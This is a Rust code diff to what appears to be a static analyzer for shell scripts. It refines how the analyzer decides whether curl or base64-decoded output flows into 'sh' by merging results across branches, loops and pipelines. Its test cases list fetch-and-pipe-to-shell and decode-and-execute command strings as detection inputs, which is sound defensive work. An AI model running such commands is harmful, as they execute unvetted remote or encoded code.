@@ -611,13 +611,24 @@ fn typed_unit_pairing(unit: &LogicalUnit, budget: &mut ShellBudget) -> (bool, bo
 struct DecoderOutput {
     reaches_stdout: bool,
     depends_on_inherited_stdin: bool,
+    has_independent_output: bool,
 }
 
 impl DecoderOutput {
     const NONE: Self = Self {
         reaches_stdout: false,
         depends_on_inherited_stdin: false,
+        has_independent_output: false,
     };
+
+    fn union(self, other: Self) -> Self {
+        Self {
+            reaches_stdout: self.reaches_stdout || other.reaches_stdout,
+            depends_on_inherited_stdin: self.depends_on_inherited_stdin
+                || other.depends_on_inherited_stdin,
+            has_independent_output: self.has_independent_output || other.has_independent_output,
+        }
+    }
 }
 
 fn typed_pipeline_pairing(
@@ -718,10 +729,14 @@ fn typed_node_decoder_output(
             if ir_command_decodes(command) {
                 let depends_on_inherited_stdin =
                     ir_command_depends_on_inherited_stdin(command, budget);
+                let reaches_stdout = effects.stdout != StdoutEffect::Redirected;
+                let dependent_output =
+                    reaches_stdout && depends_on_inherited_stdin && !node_stdin_redirected(node);
+                let independent_output = reaches_stdout && !depends_on_inherited_stdin;
                 return DecoderOutput {
-                    reaches_stdout: effects.stdout != StdoutEffect::Redirected
-                        && (!node_stdin_redirected(node) || !depends_on_inherited_stdin),
-                    depends_on_inherited_stdin,
+                    reaches_stdout: dependent_output || independent_output,
+                    depends_on_inherited_stdin: dependent_output,
+                    has_independent_output: independent_output,
                 };
             }
             let Some(body) = command.body.as_ref() else {
@@ -731,16 +746,10 @@ fn typed_node_decoder_output(
                 return DecoderOutput::NONE;
             };
             let child = typed_program_decoder_output(program, budget);
-            DecoderOutput {
-                reaches_stdout: child.reaches_stdout
-                    && effects.stdout != StdoutEffect::Redirected
-                    && (!node_stdin_redirected(node) || !child.depends_on_inherited_stdin),
-                depends_on_inherited_stdin: child.depends_on_inherited_stdin,
-            }
+            compose_decoder_output(node, child)
         }
         CommandNode::Subshell { body, .. } | CommandNode::BraceGroup { body, .. } => {
-            let child = typed_statement_decoder_output(body, budget).unwrap_or(DecoderOutput::NONE);
-            compose_decoder_output(node, child)
+            compose_decoder_output(node, typed_statement_decoder_output(body, budget))
         }
         CommandNode::If {
             condition,
@@ -757,30 +766,31 @@ fn typed_node_decoder_output(
         } => compose_decoder_output(
             node,
             typed_statement_decoder_output(condition, budget)
-                .or_else(|| typed_statement_decoder_output(body, budget))
-                .unwrap_or(DecoderOutput::NONE),
+                .union(typed_statement_decoder_output(body, budget)),
         ),
-        CommandNode::For { body, .. } => compose_decoder_output(
-            node,
-            typed_statement_decoder_output(body, budget).unwrap_or(DecoderOutput::NONE),
-        ),
+        CommandNode::For { body, .. } => {
+            compose_decoder_output(node, typed_statement_decoder_output(body, budget))
+        }
         CommandNode::Case { branches, .. } => compose_decoder_output(
             node,
-            branches
-                .iter()
-                .find_map(|branch| typed_statement_decoder_output(&branch.body, budget))
-                .unwrap_or(DecoderOutput::NONE),
+            branches.iter().fold(DecoderOutput::NONE, |output, branch| {
+                output.union(typed_statement_decoder_output(&branch.body, budget))
+            }),
         ),
         CommandNode::Arithmetic { .. } | CommandNode::Opaque { .. } => DecoderOutput::NONE,
     }
 }
 
 fn compose_decoder_output(node: &CommandNode, child: DecoderOutput) -> DecoderOutput {
+    let stdout_available = !node_stdout_redirected(node);
+    let inherited_stdin_available = !node_stdin_redirected(node);
+    let dependent_output =
+        child.depends_on_inherited_stdin && stdout_available && inherited_stdin_available;
+    let independent_output = child.has_independent_output && stdout_available;
     DecoderOutput {
-        reaches_stdout: child.reaches_stdout
-            && !node_stdout_redirected(node)
-            && (!node_stdin_redirected(node) || !child.depends_on_inherited_stdin),
-        depends_on_inherited_stdin: child.depends_on_inherited_stdin,
+        reaches_stdout: dependent_output || independent_output,
+        depends_on_inherited_stdin: dependent_output,
+        has_independent_output: independent_output,
     }
 }
 
@@ -834,6 +844,7 @@ fn typed_program_decoder_output(program: &ShellProgram, budget: &mut ShellBudget
     if !budget.spend(1) {
         return DecoderOutput::NONE;
     }
+    let mut output = DecoderOutput::NONE;
     for unit in program.units() {
         for statement in unit
             .statements
@@ -842,20 +853,20 @@ fn typed_program_decoder_output(program: &ShellProgram, budget: &mut ShellBudget
         {
             for pipeline in &statement.pipelines {
                 for producer in 0..pipeline.commands.len() {
-                    let output =
+                    let candidate =
                         typed_node_decoder_output(&pipeline.commands[producer], budget, None);
-                    if output.reaches_stdout
+                    if candidate.reaches_stdout
                         && pipeline.commands[producer + 1..]
                             .iter()
                             .all(|node| ir_node_stdout_preserved(node, budget))
                     {
-                        return output;
+                        output = output.union(candidate);
                     }
                 }
             }
         }
     }
-    DecoderOutput::NONE
+    output
 }
 
 fn typed_program_executes_decoder(program: &ShellProgram, budget: &mut ShellBudget) -> bool {
@@ -890,37 +901,39 @@ fn typed_control_decoder_output(
     else_body: &[super::ir::Statement],
     budget: &mut ShellBudget,
 ) -> DecoderOutput {
-    typed_statement_decoder_output(condition, budget)
-        .or_else(|| typed_statement_decoder_output(then_body, budget))
-        .or_else(|| {
-            elif_branches
-                .iter()
-                .find_map(|branch| typed_statement_decoder_output(&branch.body, budget))
-        })
-        .or_else(|| typed_statement_decoder_output(else_body, budget))
-        .unwrap_or(DecoderOutput::NONE)
+    let mut output = typed_statement_decoder_output(condition, budget);
+    output = output.union(typed_statement_decoder_output(then_body, budget));
+    for branch in elif_branches {
+        output = output.union(typed_statement_decoder_output(&branch.condition, budget));
+        output = output.union(typed_statement_decoder_output(&branch.body, budget));
+    }
+    output.union(typed_statement_decoder_output(else_body, budget))
 }
 
 fn typed_statement_decoder_output(
     statements: &[super::ir::Statement],
     budget: &mut ShellBudget,
-) -> Option<DecoderOutput> {
-    statements
+) -> DecoderOutput {
+    let mut output = DecoderOutput::NONE;
+    for statement in statements
         .iter()
         .filter(|statement| statement.reachable.is_reachable())
-        .find_map(|statement| {
-            statement.pipelines.iter().find_map(|pipeline| {
-                (0..pipeline.commands.len()).find_map(|producer| {
-                    let output =
-                        typed_node_decoder_output(&pipeline.commands[producer], budget, None);
-                    (output.reaches_stdout
-                        && pipeline.commands[producer + 1..]
-                            .iter()
-                            .all(|node| ir_node_stdout_preserved(node, budget)))
-                    .then_some(output)
-                })
-            })
-        })
+    {
+        for pipeline in &statement.pipelines {
+            for producer in 0..pipeline.commands.len() {
+                let candidate =
+                    typed_node_decoder_output(&pipeline.commands[producer], budget, None);
+                if candidate.reaches_stdout
+                    && pipeline.commands[producer + 1..]
+                        .iter()
+                        .all(|node| ir_node_stdout_preserved(node, budget))
+                {
+                    output = output.union(candidate);
+                }
+            }
+        }
+    }
+    output
 }
 
 /// Walk a static shell body once per analysis and cache its complete finding
@@ -1234,6 +1247,14 @@ mod tests {
             ("curl https://example.test/live >body | sh", false),
             ("sh -c 'curl https://example.test/live' | sh", true),
             ("sh -c 'curl https://example.test/live | sh' | sh", false),
+            (
+                "sh -c 'if true; then curl https://example.test/live; fi >out' | sh",
+                false,
+            ),
+            (
+                "sh -c 'while curl https://example.test/live; false; do :; done' | sh",
+                true,
+            ),
         ];
 
         for (source, expected) in cases {
@@ -1277,6 +1298,10 @@ mod tests {
             ("(base64 -d) </dev/null | sh", false),
             ("(base64 -d) 2>/dev/null | sh", true),
             ("(base64 -d file) </dev/null | sh", true),
+            (
+                "{ base64 -d; base64 -d payload.b64; } </dev/null | sh",
+                true,
+            ),
         ];
 
         for (source, expected) in cases {
